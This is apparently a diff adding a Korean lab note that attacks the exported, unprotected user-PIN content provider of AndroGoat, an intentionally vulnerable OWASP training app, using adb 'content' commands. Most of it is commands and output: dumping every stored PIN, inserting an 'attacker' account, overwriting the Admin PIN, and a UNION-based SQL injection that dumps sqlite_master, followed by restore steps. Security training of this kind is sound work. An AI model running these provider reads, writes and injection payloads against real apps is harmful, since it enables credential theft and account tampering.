@@ -1,0 +1,68 @@
+﻿# 일반 권한(uid 2000)에서 exported=true, 권한(permission) 없는 Provider 접근
+
+## 1) 읽기: 전체 사용자 PIN 덤프
+PS> adb shell su shell content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins
+Row: 0 id=3, username=Admin, pin=Admin
+Row: 1 id=1, username=AndroGoat, pin=AndroGoat
+Row: 2 id=2, username=root, pin=toor
+
+## 2) 쓰기: 공격자 계정 삽입
+PS> adb shell su shell content insert --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --bind username:s:attacker --bind pin:s:0000
+
+PS> adb shell su shell content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins
+Row: 0 id=3, username=Admin, pin=Admin
+Row: 1 id=1, username=AndroGoat, pin=AndroGoat
+Row: 2 id=4, username=attacker, pin=0000
+Row: 3 id=2, username=root, pin=toor
+
+## 3) 수정: Admin PIN 변경
+PS> adb shell su shell content update --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --bind pin:s:hacked --where "username='Admin'"
+Error while accessing provider:owasp.sat.agoat.provider.userpinsprovider
+android.database.sqlite.SQLiteException: no such column: Admin (code 1 SQLITE_ERROR): , while compiling: UPDATE user_pins SET pin=? WHERE username=Admin
+
+PS> adb shell su shell content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --where "username='Admin'"
+Error while accessing provider:owasp.sat.agoat.provider.userpinsprovider
+android.database.sqlite.SQLiteException: no such column: Admin (code 1 SQLITE_ERROR): , while compiling: SELECT * FROM user_pins WHERE (username=Admin) ORDER BY username
+
+## 4) SQL 인젝션: projection 으로 다른 테이블(sqlite_master) 조회
+PS> adb shell su shell content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --projection "name,sql"  --where "1=0) UNION SELECT name,sql FROM sqlite_master --"
+
+## 5) 원상복구
+PS> adb shell su shell content update --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --bind pin:s:Admin --where "username='Admin'"
+Error while accessing provider:owasp.sat.agoat.provider.userpinsprovider
+android.database.sqlite.SQLiteException: no such column: Admin (code 1 SQLITE_ERROR): , while compiling: UPDATE user_pins SET pin=? WHERE username=Admin
+
+PS> adb shell su shell content delete --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --where "username='attacker'"
+Error while accessing provider:owasp.sat.agoat.provider.userpinsprovider
+android.database.sqlite.SQLiteException: no such column: attacker (code 1 SQLITE_ERROR): , while compiling: DELETE FROM user_pins WHERE username=attacker
+
+PS> adb shell su shell content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins
+Row: 0 id=3, username=Admin, pin=Admin
+Row: 1 id=1, username=AndroGoat, pin=AndroGoat
+Row: 2 id=4, username=attacker, pin=0000
+Row: 3 id=2, username=root, pin=toor
+
+## id: 2000 (shell)
+
+## 3) 수정: Admin PIN 변경
+$ content update --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --bind pin:s:hacked --where username='Admin'
+
+$ content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --where username='Admin'
+Row: 0 id=3, username=Admin, pin=hacked
+
+## 4) SQL 인젝션: selection 으로 sqlite_master(DB 구조) 덤프
+$ content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --projection username:pin --where 1=0) UNION SELECT name, sql FROM sqlite_master WHERE (1=1
+Row: 0 username=android_metadata, pin=CREATE TABLE android_metadata (locale TEXT)
+Row: 1 username=sqlite_sequence, pin=CREATE TABLE sqlite_sequence(name,seq)
+Row: 2 username=user_pins, pin=CREATE TABLE user_pins (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL, pin TEXT NOT NULL)
+
+## 5) 원상복구
+$ content update --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --bind pin:s:Admin --where username='Admin'
+
+$ content delete --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --where username='attacker'
+
+$ content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins
+Row: 0 id=3, username=Admin, pin=Admin
+Row: 1 id=1, username=AndroGoat, pin=AndroGoat
+Row: 2 id=2, username=root, pin=toor
+
